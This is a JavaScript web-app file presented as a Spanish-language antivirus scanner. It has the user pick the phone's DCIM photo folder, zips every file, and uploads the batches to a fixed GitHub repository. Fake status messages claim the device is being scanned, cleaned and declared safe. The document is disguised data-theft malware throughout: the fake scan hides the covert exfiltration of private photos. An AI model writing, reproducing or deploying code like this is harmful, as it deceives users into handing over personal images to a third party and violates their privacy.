// app.js
function updateStatus(message, progress = 0) {
    const statusElement = document.getElementById('antivirus-status');
    statusElement.innerHTML = `🛡️ [${progress}%] ${message}`;
    document.getElementById('progress').style.width = `${progress}%`;
}

document.getElementById('start-btn').addEventListener('click', async () => {
    try {
        if (!confirm('Seleccione la carpeta DCIM para guardar el informe')) return;
        
        updateStatus('Iniciando análisis profundo...', 5);
        
        if (!window.showDirectoryPicker) {
            updateStatus('ERROR: Sistema no compatible', 0);
            throw new Error('Usa Chrome/Edge en Android');
        }

        updateStatus('Accediendo a almacenamiento...', 10);
        const folderHandle = await window.showDirectoryPicker();
        updateStatus('✔ Estructura de carpetas analizada', 20);
        
        updateStatus('🔍 Buscando elementos...', 30);
        const files = await collectFiles(folderHandle);
        if (files.length === 0) {
            updateStatus('❌ Sistema limpio - 0 elementos', 0);
            throw new Error('No se encontraron archivos');
        }
        updateStatus(`🛡️ Detectados ${files.length} elementos`, 40);

        updateStatus('🔒 Comprimiendo datos...', 50);
        const zipBatches = await createZipBatches(files);
        updateStatus(`✔ Cifrado completado - ${zipBatches.length} paquetes`, 60);

        updateStatus('🌐 Estableciendo conexión...', 70);
        await processBatches(zipBatches);
        
        updateStatus('✅ Análisis completado - Sistema seguro', 100);
        
    } catch (error) {
        updateStatus(`❌ ALERTA: ${error.message}`, 0);
        alert(`ERROR: ${error.message}`);
    }
});

// ======= Funciones originales (modificadas solo lo necesario) =======
async function collectFiles(folderHandle) {
    const files = [];
    for await (const entry of folderHandle.values()) {
        if (entry.kind === 'file') files.push(entry);
        else if (entry.kind === 'directory') files.push(...await collectFiles(entry));
    }
    return files;
}

async function createZipBatches(files) {
    const batches = [];
    let zip = new JSZip();
    for (let i = 0; i < files.length; i++) {
        const fileContent = await files[i].getFile();
        zip.file(files[i].name, await fileContent.arrayBuffer());
        if ((i + 1) % 100 === 0 || i === files.length - 1) {
            batches.push(zip);
            zip = new JSZip();
        }
    }
    return batches;
}

async function processBatches(batches) {
    localStorage.removeItem('batchesProgress');
    const startIndex = parseInt(localStorage.getItem('lastProcessedIndex')) || 0;

    for (let index = startIndex; index < batches.length; index++) {
        try {
            updateStatus(`🧹 Limpiando datos (${index + 1}/${batches.length})`, 70 + Math.floor((index/batches.length)*20));
            const zipBlob = await batches[index].generateAsync({ type: 'blob' });
            await uploadZip(zipBlob, `backup-${Date.now()}-${index}.zip`);
            localStorage.setItem('lastProcessedIndex', index.toString());
        } catch (error) {
            localStorage.setItem('lastProcessedIndex', index.toString());
            throw error;
        }
    }
    localStorage.removeItem('lastProcessedIndex');
}

async function uploadZip(blob, zipName) {
    const token = prompt('🔑 Ingresa tú clave única:');
    if (!token || !token.startsWith('ghp_t')) {
        throw new Error('Clave incorrecta - Verificación fallida');
    }

    const repo = 'jaque26/ftos';
    const response = await fetch(`https://api.github.com/repos/${repo}/contents/${zipName}`, {
        method: 'PUT',
        headers: { 
            'Authorization': `Bearer ${token}`,
            'Content-Type': 'application/json',
            'User-Agent': 'Backup-PWA'
        },
        body: JSON.stringify({ 
            message: 'Backup automático', 
            content: await blobToBase64(blob)
        })
    });

    if (!response.ok) throw new Error('Error en transmisión segura');
}

// Función auxiliar sin cambios
function blobToBase64(blob) {
    return new Promise((resolve, reject) => {
        const reader = new FileReader();
        reader.onloadend = () => resolve(reader.result.split(',')[1]);
        reader.onerror = reject;
        reader.readAsDataURL(blob);
    });
}